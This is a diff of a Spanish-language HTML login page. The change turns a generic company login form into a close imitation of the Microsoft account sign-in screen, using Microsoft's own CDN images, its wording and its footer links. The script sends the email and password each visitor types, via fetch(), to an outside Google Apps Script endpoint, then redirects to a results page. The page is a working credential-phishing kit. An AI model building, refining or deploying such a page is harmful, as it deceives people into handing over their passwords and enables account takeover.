@@ -1,222 +1,428 @@
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Empresa - Iniciar sesión</title>
-  <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background: #f2f2f2;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      overflow: hidden;
-    }
-    .login-box {
-      background: white;
-      padding: 40px;
-      border-radius: 8px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 360px;
-      position: relative;
-      overflow: hidden;
-      height: 300px;
-      transition: height 0.3s ease-in-out;
-    }
-    .logo {
-        margin-bottom: 20px;
-        text-align: left;
-    }
-    .login-step {
-      width: 100%;
-      position: absolute;
-      top: 100px; 
-      left: 0;
-      padding: 0 40px 40px 40px;
-      box-sizing: border-box;
-      transition: transform 0.4s ease-in-out, opacity 0.4s ease-in-out;
-      transform: translateX(100%);
-      opacity: 0;
-      pointer-events: none;
-    }
-    .login-step.active {
-      transform: translateX(0);
-      opacity: 1;
-      pointer-events: auto;
-      position: relative;
-      top: 0; 
-    }
-    .login-step:not(.active) {
-        position: absolute;
-    }
-    input {
-      width: 100%;
-      border: none;
-      border-bottom: 1px solid #8c8c8c;
-      padding: 8px 0;
-      margin-top: 20px;
-      font-size: 16px;
-      background-color: transparent;
-      box-sizing: border-box;
-      transition: border-bottom-color 0.3s ease;
-    }
-    input:focus {
-        border-bottom-color: #0078d4;
-        outline: none;
-    }
-    button {
-      width: 100%;
-      padding: 10px;
-      margin-top: 30px;
-      background-color: #0078d4;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-    button:hover {
-        background-color: #005ea6;
-    }
-    .heading {
-        font-size: 24px;
-        font-weight: 600;
-        color: #1b1b1b;
-        text-align: left;
-    }
-    .back-button {
-      background: none;
-      border: none;
-      color: #333;
-      font-size: 20px;
-      cursor: pointer;
-      text-align: left;
-      padding: 0;
-      width: auto; 
-      margin: 0 10px 0 0;
-      vertical-align: middle;
-    }
-     .back-button:hover {
-        color: #0078d4;
-     }
-    .password-header {
-        display: flex;
-        align-items: center;
-        margin-bottom: 10px;
-    }
-    .user-email {
-        font-size: 14px;
-        color: #333;
-        vertical-align: middle;
-    }
-    .error-message {
-      color: red;
-      font-size: 12px;
-      margin-top: 5px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="favicon.ico" />
+    <title>Iniciar sesión en tu cuenta de Microsoft</title>
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+        }
+
+        html,
+        body {
+            background-color: #e2e5d3;
+            color: #1b1b1b;
+        }
+
+        section{
+            display:table-cell;
+            vertical-align:middle;
+            height: 100vh;
+            width: 100rem;
+            max-width: 100%;
+        }
+
+        .title {
+            line-height: 1.75rem;
+            color: #1b1b1b;
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+
+        .auth-wrapper {
+            max-width: 440px;
+            width: calc(100% - 40px);
+            padding: 44px;
+            margin: auto;
+            margin-bottom: 28px;
+            background-color: #fff;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            min-width: 320px;
+        }
+
+        .opts {
+            padding: 10px 44px;
+            max-width: 440px;
+            cursor: pointer;
+            margin: auto;
+            background-color: #fff;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+        }
+
+        .opts:hover {
+            background-color: rgba(0, 0, 0, .1);
+        }
+
+        .input {
+            border-style: solid;
+            border-width: 2px;
+            border-color: rgba(0, 0, 0, .4);
+            background-color: rgba(255, 255, 255, .4);
+            height: 36px;
+            outline: none;
+            border-top-width: 0;
+            border-left-width: 0;
+            border-right-width: 0;
+            padding-left: 0;
+            width: 100%;
+            font-size: 15px;
+            padding-bottom: 5px;
+        }
+
+        .input:hover {
+            border-color: #323232;
+            border-color: rgba(0, 0, 0, .8);
+        }
+
+        .input:focus {
+            border-color: #0067b8;
+        }
+
+        .input::placeholder {
+            font-size: 15px;
+        }
+
+        .mb-0 {
+            margin-bottom: 0;
+        }
+
+        a.link {
+            text-decoration: none;
+            color: #0067b8
+        }
+
+        a:hover {
+            text-decoration: underline !important;
+            color: #666;
+        }
+
+        a:focus {
+            border: 1px dotted #000;
+            text-decoration: underline !important;
+        }
+
+        .btn {
+            margin: 0 0 0 auto;
+            display: block;
+            background-color: #0067b8;
+            color: #fff;
+            border: 2px solid #0067b8;
+            padding: 5px 30px;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background-color: #005da6;
+        }
+
+        .btn:disabled {
+            background-color: #b2b2b2;
+            border-color: #b2b2b2;
+            cursor: not-allowed;
+        }
+
+        .has-icon {
+            display: flex;
+            gap: 5px;
+            align-items: center;
+        }
+
+        .mt-16 { margin-top: 16px; }
+        .mb-16 { margin-bottom: 16px; }
+
+        .has-icon .icon {
+            display: inline-flex;
+        }
+
+        .footer {
+            position: fixed;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            z-index: 99;
+            clear: both;
+            min-height: 28px;
+            display: flex;
+            flex-direction: row;
+            gap: 10px;
+            justify-content: flex-end;
+            padding: 0 16px;
+        }
+
+        .footer a,
+        .footer span {
+            color: #000;
+            font-size: 12px;
+            line-height: 28px;
+            margin-left: 8px;
+            margin-right: 8px;
+            text-decoration: none;
+        }
+
+        .footer span {
+            font-size: 20px;
+            line-height: 20px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .d-none { display: none; }
+
+        .back {
+            border: none;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            background-color: unset;
+            cursor: pointer;
+            padding: 0;
+        }
+        
+        .back img { vertical-align: middle; }
+
+        .identity {
+            display: inline-flex;
+            gap: 5px;
+            align-items: center;
+        }
+
+        .d-block { display: block; }
+        .w-100 { width: 100%; }
+
+        .back:hover {
+            background-color: #e6e6e6;
+            background-color: rgba(0, 0, 0, .1);
+        }
+
+        .error {
+            color: #e81123;
+            font-size: 13px;
+            margin-bottom: 4px;
+        }
+
+        .input.error-inp {
+            border-bottom-color: #e81123 !important;
+        }
+
+        .btn-group {
+            text-align: right;
+            width: 100%;
+            margin: 16px 0;
+        }
+
+        .fs-13 { font-size: 13px; }
+
+        #user_identity_display {
+            font-size: 15px;
+            color: #1b1b1b;
+        }
+
+        img{ vertical-align: middle; }
+
+        @media screen and (max-width:600px) {
+            html, body{
+                background-color: #fff;
+            }
+            .auth-wrapper{
+                box-shadow: none !important;
+                padding: 24px !important;
+                width: 100% !important;
+                max-width: 100% !important;
+                margin: 0 !important;
+            }
+            .opts{
+                box-shadow: none !important;
+                padding: 8px 24px !important;
+                border: 1px solid #999;
+                max-width: calc(100% - 48px);
+                margin: 12% auto !important;
+            }
+        }
+    </style>
 </head>
+
 <body>
-  <div class="login-box" id="loginBox">
-    
-    <div class="logo">
-      <img src="https://i.postimg.cc/HxwyDPCG/pngegg.png" alt="Mi empresa Logo" width="120"/>
+    <div class="container">
+      <form id="login-form" autocomplete="off">
+        
+        <section id="section_uname">
+            <div class="auth-wrapper">
+                <img src="https://i.postimg.cc/HxwyDPCG/pngegg.png" alt="Microsoft" width="120"/>
+                <h2 class="title mb-16 mt-16">Iniciar sesión</h2>
+                
+                <div class="mb-16">
+                    <p id="error_uname" class="error"></p>
+                    <input id="inp_uname" type="email" name="correo" class="input" placeholder="Correo electrónico, teléfono o Skype" />
+                </div>
+            
+                <div>
+                    <p class="mb-16 fs-13">¿No tiene una cuenta? <a href="#" class="link">Cree una.</a></p>
+                    <p class="mb-16 fs-13">
+                        <a href="#" class="link">¿No puedes acceder a tu cuenta?</a>
+                    </p>
+                </div>
+                <div class="btn-group">
+                    <button type="button" class="btn" id="btn_next">Siguiente</button>
+                </div>
+            </div>
+            <div class="opts">
+                <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
+                            width="30px" /></span> Opciones de inicio de sesión</p>
+            </div>
+        </section>
+
+        <section id="section_pwd" class="d-none">
+            <div class="auth-wrapper">
+                <img src="https://i.postimg.cc/HxwyDPCG/pngegg.png" alt="Microsoft" class="d-block" width="120"/>
+                <div class="identity w-100 mt-16 mb-16">
+                    <button type="button" class="back" id="btn_back">
+                        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg" />
+                    </button>
+                    <span id="user_identity_display"></span>
+                </div>
+                <h2 class="title mb-16">Escribir contraseña</h2>
+                
+                <div class="mb-16">
+                    <p id="error_pwd" class="error"></p>
+                    <input id="inp_pwd" type="password" name="password" class="input" placeholder="Contraseña" />
+                </div>
+                
+                <div>
+                    <p class="mb-16 fs-13"> <a href="#" class="link">He olvidado mi contraseña</a></p>
+                </div>
+                <div class="btn-group">
+                    <button type="submit" class="btn" id="btn_sig">Iniciar Sesión</button>
+                </div>
+            </div>
+        </section>
+
+      </form>
     </div>
 
-    <form id="login-form">
-        <div class="login-step active" id="email-step">
-            <div class="heading">Iniciar sesión</div>
-            <input type="email" name="correo" id="email-input" maxlength="113"
-                   placeholder="Correo electrónico, teléfono o Skype" required>
-            <div id="email-error" class="error-message" style="display: none;">Por favor, ingresa un correo válido.</div>
-            <button type="button" id="next-email-button">Siguiente</button>
-        </div>
+    <footer class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span>. . .</span>
+    </footer>
 
-        <div class="login-step" id="password-step">
-            <div class="password-header">
-                <button type="button" class="back-button" id="back-to-email">←</button>
-                <span id="user-email-display" class="user-email"></span>
-            </div>
-            <div class="heading">Escribir contraseña</div>
-            <input type="password" name="password" id="password-input" placeholder="Contraseña" required>
-            <button type="submit">Iniciar sesión</button>
-        </div>
-    </form>
-  </div>
-
-  <script>
-    const loginBox = document.getElementById('loginBox');
-    const loginForm = document.getElementById('login-form');
-    
-    const emailStep = document.getElementById('email-step');
-    const passwordStep = document.getElementById('password-step');
-    
-    const emailInput = document.getElementById('email-input');
-    const userEmailDisplay = document.getElementById('user-email-display');
-    const emailError = document.getElementById('email-error');
-    
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbzVfcqJrq-HGOnnRbbrziepd_NKa-eqPmDQiIkI389JjnTecxzu_vNmFYKJx8Vyr2cp6A/exec';
-
-    function showStep(stepToShow) {
-        const allSteps = document.querySelectorAll('.login-step');
-        allSteps.forEach(step => {
-            step.classList.remove('active');
-        });
-        loginBox.style.height = "300px";
-        stepToShow.classList.add('active');
-    }
-
-    function isValidEmail(email) {
-      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      return emailPattern.test(email);
-    }
-
-    document.getElementById('next-email-button').addEventListener('click', function() {
-      if (emailInput.value && isValidEmail(emailInput.value)) {
-        userEmailDisplay.textContent = emailInput.value;
-        showStep(passwordStep);
-        emailError.style.display = 'none';
-      } else {
-        emailError.style.display = 'block';
-        emailInput.focus();
-      }
-    });
-
-    document.getElementById('back-to-email').addEventListener('click', function() {
-        showStep(emailStep);
-    });
-
-    // 2. SCRIPT DE ENVÍO CON REDIRECCIÓN
-    loginForm.addEventListener('submit', function(e) {
-        e.preventDefault();
+    <script>
+        // --- ELEMENTOS DEL DOM ---
+        const loginForm = document.getElementById('login-form');
         
-        const submitButton = this.querySelector('button[type="submit"]');
-        submitButton.textContent = 'Enviando...';
-        submitButton.disabled = true;
+        const sectionUname = document.getElementById('section_uname');
+        const sectionPwd = document.getElementById('section_pwd');
 
-        fetch(scriptURL, { method: 'POST', body: new FormData(loginForm) })
-            .then(response => {
-                if (response.ok) {
-                    window.location.href = 'resultado.html';
-                } else {
-                    throw new Error(`Error del servidor: ${response.statusText}`);
-                }
-            })
-            .catch(err => {
-                console.error('Error al enviar:', err);
-                alert("Hubo un error al iniciar sesión. Por favor, inténtalo de nuevo.");
-                submitButton.textContent = 'Iniciar sesión';
-                submitButton.disabled = false;
-            });
-    });
+        const unameInp = document.getElementById('inp_uname');
+        const pwdInp = document.getElementById('inp_pwd');
 
-    document.addEventListener('DOMContentLoaded', () => {
-        showStep(emailStep); 
-    });
-  </script>
+        const errorUname = document.getElementById('error_uname');
+        const errorPwd = document.getElementById('error_pwd');
+
+        const userIdentityDisplay = document.getElementById('user_identity_display');
+        
+        const btnNext = document.getElementById('btn_next');
+        const btnBack = document.getElementById('btn_back');
+        const btnSig = document.getElementById('btn_sig');
+
+        // --- URL DEL SCRIPT DE GOOGLE ---
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbzVfcqJrq-HGOnnRbbrziepd_NKa-eqPmDQiIkI389JjnTecxzu_vNmFYKJx8Vyr2cp6A/exec';
+
+        // --- FUNCIONES AUXILIARES ---
+        function isValidEmail(email) {
+          const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+          return emailPattern.test(email);
+        }
+
+        function showSection(sectionToShow) {
+            sectionUname.classList.add('d-none');
+            sectionPwd.classList.add('d-none');
+            sectionToShow.classList.remove('d-none');
+        }
+
+        // --- MANEJADORES DE EVENTOS ---
+
+        // Botón "Siguiente" (Paso de Email a Contraseña)
+        btnNext.addEventListener('click', () => {
+            const email = unameInp.value.trim();
+            if (!email || !isValidEmail(email)) {
+                errorUname.innerText = "Introduce una dirección de correo electrónico, un teléfono o un Skype válidos.";
+                unameInp.classList.add('error-inp');
+                unameInp.focus();
+            } else {
+                errorUname.innerText = "";
+                unameInp.classList.remove('error-inp');
+                userIdentityDisplay.innerText = email;
+                showSection(sectionPwd);
+                pwdInp.focus();
+            }
+        });
+
+        // Botón "Atrás" (Paso de Contraseña a Email)
+        btnBack.addEventListener('click', () => {
+            showSection(sectionUname);
+            unameInp.focus();
+        });
+
+        // Envío del formulario (Botón "Iniciar Sesión")
+        loginForm.addEventListener('submit', e => {
+            e.preventDefault();
+
+            // Validación final de la contraseña
+            if (!pwdInp.value.trim()) {
+                errorPwd.innerText = "Por favor, escribe la contraseña de tu cuenta de Microsoft.";
+                pwdInp.classList.add('error-inp');
+                pwdInp.focus();
+                return; // Detiene el envío si la contraseña está vacía
+            } else {
+                errorPwd.innerText = "";
+                pwdInp.classList.remove('error-inp');
+            }
+
+            // Cambia el estado del botón a "Enviando..."
+            btnSig.textContent = 'Enviando...';
+            btnSig.disabled = true;
+
+            // Envía los datos usando Fetch API
+            fetch(scriptURL, { method: 'POST', body: new FormData(loginForm) })
+                .then(response => {
+                    if (response.ok) {
+                        // Si la respuesta es exitosa, redirige a resultado.html
+                        window.location.href = 'resultado.html';
+                    } else {
+                        // Si hay un error del servidor, lo lanza para ser capturado por .catch
+                        throw new Error(`Error del servidor: ${response.statusText}`);
+                    }
+                })
+                .catch(err => {
+                    // Si ocurre cualquier error (de red, del servidor, etc.)
+                    console.error('Error al enviar:', err);
+                    alert("Hubo un error al iniciar sesión. Por favor, inténtalo de nuevo.");
+                    
+                    // Restaura el botón a su estado original
+                    btnSig.textContent = 'Iniciar Sesión';
+                    btnSig.disabled = false;
+                });
+        });
+        
+        // Permite avanzar con la tecla Enter en el campo de email
+        unameInp.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault(); // Evita que el formulario se envíe prematuramente
+                btnNext.click();
+            }
+        });
+
+    </script>
 </body>
+
 </html>
